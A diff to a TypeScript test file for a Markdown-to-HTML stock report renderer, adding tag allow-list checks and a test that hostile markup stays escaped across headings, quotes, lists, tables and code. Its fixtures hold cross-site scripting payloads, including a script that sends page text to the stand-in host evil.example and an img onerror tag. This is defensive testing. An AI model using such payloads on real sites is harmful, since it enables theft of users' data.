@@ -26,6 +26,35 @@ async function inTemporaryWorkingDirectory(
   }
 }
 
+function reportBody(html: string): string {
+  const match = html.match(/<div class="body" id="report-body">\n([\s\S]*?)\n<\/div>/);
+  assert.ok(match, "the report body must be present in the rendered document");
+  return match[1];
+}
+
+function assertTrustedReportBodyMarkup(body: string): void {
+  const trustedTags = new Set([
+    "h1", "h2", "h3", "h4", "blockquote", "p", "ul", "ol", "li",
+    "table", "thead", "tbody", "tr", "th", "td", "strong", "em", "code", "span", "hr",
+  ]);
+  const trustedSpanClasses = new Set(["badge badge-buy", "badge badge-hold", "badge badge-sell", "pos", "neg"]);
+
+  for (const [, tag] of body.matchAll(/<\/?([a-z][a-z0-9-]*)(?:\s[^<>]*)?>/gi)) {
+    assert.ok(trustedTags.has(tag.toLowerCase()), `unexpected report-body tag: ${tag}`);
+  }
+
+  for (const [, tag, attributes] of body.matchAll(/<([a-z][a-z0-9-]*)([^<>]*)>/gi)) {
+    const normalizedTag = tag.toLowerCase();
+    if (normalizedTag === "span") {
+      const classMatch = attributes.match(/^ class="([^"]+)"$/);
+      assert.ok(classMatch, `unexpected span attributes: ${attributes}`);
+      assert.ok(trustedSpanClasses.has(classMatch[1]), `unexpected span class: ${classMatch[1]}`);
+    } else {
+      assert.equal(attributes, "", `unexpected ${normalizedTag} attributes: ${attributes}`);
+    }
+  }
+}
+
 test("renders seller HTML payloads as inert text", () => {
   const payloads = [
     "<script>fetch('https://evil.example/' + document.body.innerText)</script>",
@@ -46,6 +75,41 @@ test("renders seller HTML payloads as inert text", () => {
     assert.doesNotMatch(html, /\bon(?:error|load)\s*=\s*["']/i);
     assert.doesNotMatch(html, /<\/div><style>body\{display:none\}/i);
   }
+});
+
+test("keeps hostile Markdown inert across every supported report element", () => {
+  const rawAttackerMarkup = '<img src="https://evil.example/pixel" onerror="alert(1)"><script>globalThis.pwned=1</script>';
+  const preEncodedEntities = "&lt;already-encoded&gt; &amp;";
+  const report = [
+    `# Heading ${rawAttackerMarkup} ${preEncodedEntities}`,
+    `> Quote ${rawAttackerMarkup} ${preEncodedEntities}`,
+    `- Unordered ${rawAttackerMarkup} ${preEncodedEntities}`,
+    `1. Ordered ${rawAttackerMarkup} ${preEncodedEntities}`,
+    [
+      "| Column |",
+      "| --- |",
+      `| Table ${rawAttackerMarkup} ${preEncodedEntities} |`,
+    ].join("\n"),
+    `*Emphasis ${rawAttackerMarkup} ${preEncodedEntities}*`,
+    `\`Code ${rawAttackerMarkup} ${preEncodedEntities}\``,
+  ].join("\n\n");
+  const body = reportBody(renderReportHtml(report, {
+    jobId: "7",
+    date: "23 July 2026",
+    symbols: "AAPL",
+  }));
+
+  assertTrustedReportBodyMarkup(body);
+  assert.match(body, /<blockquote><p>Quote /);
+  assert.match(body, /<ul><li>Unordered /);
+  assert.match(body, /<ol><li>Ordered /);
+  assert.match(body, /<table><thead><tr><th>Column<\/th><\/tr><\/thead><tbody><tr><td>Table /);
+  assert.match(body, /<em>Emphasis /);
+  assert.match(body, /<code>Code /);
+  const escapedAttackerMarkup = "&lt;img src=&quot;https://evil.example/pixel&quot; onerror=&quot;alert(1)&quot;&gt;&lt;script&gt;globalThis.pwned=1&lt;/script&gt;";
+  assert.equal(body.split(escapedAttackerMarkup).length - 1, 7);
+  assert.equal(body.split("&amp;lt;already-encoded&amp;gt; &amp;amp;").length - 1, 7);
+  assert.doesNotMatch(body, /<(?:img|script)\b/i);
 });
 
 test("escapes every metadata field", () => {
